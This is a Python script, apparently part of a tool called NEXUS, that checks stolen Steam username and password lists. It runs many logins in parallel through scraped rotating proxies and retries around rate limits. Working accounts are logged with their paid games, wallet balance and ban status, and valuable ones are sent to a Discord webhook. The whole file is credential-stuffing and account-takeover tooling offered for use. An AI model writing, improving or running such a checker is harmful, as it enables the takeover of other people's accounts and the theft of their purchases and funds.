"""
NEXUS Deep Re-Verification & Exact Library Extraction Engine
Re-validates confirmed platform credentials and extracts the authentic, owned game inventory.
Eliminates false dump claims, verifies direct authentication and retrieves real games.
"""

import sys
import os
import re
import json
import asyncio
import aiohttp
from pathlib import Path
from typing import List, Dict, Any, Optional

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

BASE_DIR = Path(__file__).resolve().parent
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from nexus.config import (
    install_resilient_dns, RESULTS_DIR, PROXIES_FILE, DISCORD_WEBHOOK_URL
)
install_resilient_dns()

from nexus.core.validator import validate_credential_tuple, parse_credential_line
from nexus.core.proxy_pool import NetworkRelayPool
from nexus.core.proxy_scraper import scrape_fresh_proxies, filter_operational_proxies
from nexus.core.transport import SessionTransportPool
from nexus.core.library import extract_library_inventory, is_item_free
from nexus.utils.discord import DiscordWebhookDispatcher
from nexus.utils.targets import evaluate_target_account


class DeepRevalidator:
    def __init__(
        self,
        hits_file: Path,
        output_file: Optional[Path] = None,
        concurrency: int = 15,
        webhook_url: Optional[str] = None
    ):
        self.hits_file = Path(hits_file)
        self.output_file = Path(output_file) if output_file else RESULTS_DIR / "REVERIFIED_CONFIRMED_HITS.txt"
        self.concurrency = concurrency
        self.webhook_url = (webhook_url or DISCORD_WEBHOOK_URL).strip()
        self.dispatcher = DiscordWebhookDispatcher(self.webhook_url) if self.webhook_url else None
        self.relay_pool = NetworkRelayPool()
        self.transport_pool = SessionTransportPool(pool_limit=concurrency * 2)

    def extract_candidates(self) -> List[tuple[str, str]]:
        """Parses credential tuples from hits files or dump records."""
        candidates = []
        seen = set()

        if not self.hits_file.exists():
            print(f"[RE-VERIFY] Warning: Source file {self.hits_file} does not exist.")
            return candidates

        with open(self.hits_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("=") or line.startswith("#"):
                    continue
                user, pwd = parse_credential_line(line)
                if user and pwd:
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        candidates.append((user, pwd))
        return candidates

    async def run(self):
        print(f"\033[1;36m[RE-VERIFY] Initializing Deep Re-Verification Engine...\033[0m")
        candidates = self.extract_candidates()
        print(f"[RE-VERIFY] Loaded {len(candidates)} unique candidates from {self.hits_file.name}")

        if not candidates:
            print("[RE-VERIFY] No candidates found to process.")
            return

        # Prepare proxies
        print("[RE-VERIFY] Ensuring operational proxy relays...")
        fresh_relays = await scrape_fresh_proxies(max_relays=120)
        valid_relays = await filter_operational_proxies(fresh_relays, concurrency=40)
        self.relay_pool.inject_relays(valid_relays)
        print(f"[RE-VERIFY] Relay pool active with {self.relay_pool.active_relay_count()} operational nodes.")

        queue = asyncio.Queue()
        for u, p in candidates:
            await queue.put((u, p, 0))

        confirmed_hits = []
        lock = asyncio.Lock()

        async def worker(worker_id: int):
            while not queue.empty():
                try:
                    user, pwd, retries = await asyncio.wait_for(queue.get(), timeout=2.0)
                except asyncio.TimeoutError:
                    break

                relay = None
                relay_url = None
                if self.relay_pool and self.relay_pool.active_relay_count() > 0:
                    relay = self.relay_pool.acquire_relay()
                    if relay:
                        relay_url = relay.get_endpoint()

                session = await self.transport_pool.acquire_session()
                result = None
                try:
                    result = await validate_credential_tuple(
                        session=session,
                        username=user,
                        password=pwd,
                        proxy=relay_url,
                        timeout_seconds=15
                    )
                except Exception as ex:
                    result = {"status": "ERROR", "error": str(ex)}
                finally:
                    await self.transport_pool.release_session(session)
                    if self.relay_pool and relay:
                        self.relay_pool.release_relay(relay)

                status = result.get("status", "ERROR") if result else "ERROR"

                if status == "RATE_LIMIT" and retries < 2:
                    if relay:
                        relay.mark_rate_limited(45)
                    await queue.put((user, pwd, retries + 1))
                    queue.task_done()
                    continue

                if status in ("PROXY_ERROR", "TIMEOUT") and retries < 2:
                    if relay:
                        relay.mark_failure(severe=False)
                    await queue.put((user, pwd, retries + 1))
                    queue.task_done()
                    continue

                if relay and status in ("HIT", "2FA_HIT", "INVALID"):
                    relay.mark_success()

                if status == "HIT":
                    is_target, matched_targets = evaluate_target_account(result)
                    if is_target:
                        result["matched_targets"] = matched_targets

                    all_games = result.get("games", [])
                    paid_games = [g for g in all_games if not g.get("is_free")]
                    paid_names = [f"{g.get('name')} ({g.get('hours', '0')}h)" for g in paid_games if g.get("name")]
                    paid_str = ", ".join(paid_names) if paid_names else "None"

                    steamid = result.get("steamid", "N/A")
                    wallet = result.get("wallet", "—")
                    country = result.get("country", "🌐 Global")
                    vac = "BANNED" if result.get("vac_banned") else "CLEAN"

                    log_line = (
                        f"{user}:{pwd} | VERIFIED REAL GAMES ({len(paid_games)} Paid): [{paid_str}] | "
                        f"SteamID: {steamid} | Wallet: {wallet} | VAC: {vac} | Country: {country}\n"
                    )

                    async with lock:
                        confirmed_hits.append(result)
                        self.output_file.parent.mkdir(parents=True, exist_ok=True)
                        with open(self.output_file, "a", encoding="utf-8") as out_f:
                            out_f.write(log_line)

                    print(f"\n\033[1;32m[CONFIRMED REAL HIT] {user}:{pwd} | Real Paid Games: {len(paid_games)} | {paid_str[:70]}...\033[0m")

                    if self.dispatcher and (is_target or len(paid_games) > 0):
                        await self.dispatcher.dispatch_hit(result)

                elif status == "2FA_HIT":
                    print(f"\033[93m[RE-VERIFY 2FA] {user} (Steam Guard Protected)\033[0m")
                elif status == "INVALID":
                    print(f"\033[90m[RE-VERIFY INVALID] {user} (Invalid Credentials)\033[0m")
                else:
                    print(f"\033[91m[RE-VERIFY {status}] {user}\033[0m")

                queue.task_done()

        tasks = [asyncio.create_task(worker(i)) for i in range(self.concurrency)]
        await asyncio.gather(*tasks, return_exceptions=True)
        await self.transport_pool.close_all()

        print(f"\n\033[1;32m[RE-VERIFY COMPLETE] Confirmed {len(confirmed_hits)} genuine hits with verified games written to {self.output_file}\033[0m")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="NEXUS Deep Re-Verification Engine")
    parser.add_argument("-f", "--file", default=str(RESULTS_DIR / "MASTER_HITS_WITH_GAMES.txt"), help="File containing hits to re-verify")
    parser.add_argument("-o", "--output", default=str(RESULTS_DIR / "REVERIFIED_CONFIRMED_HITS.txt"), help="Output file for verified games")
    parser.add_argument("-t", "--threads", type=int, default=15, help="Concurrency")
    args = parser.parse_args()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    engine = DeepRevalidator(Path(args.file), Path(args.output), concurrency=args.threads)
    loop.run_until_complete(engine.run())
    loop.close()
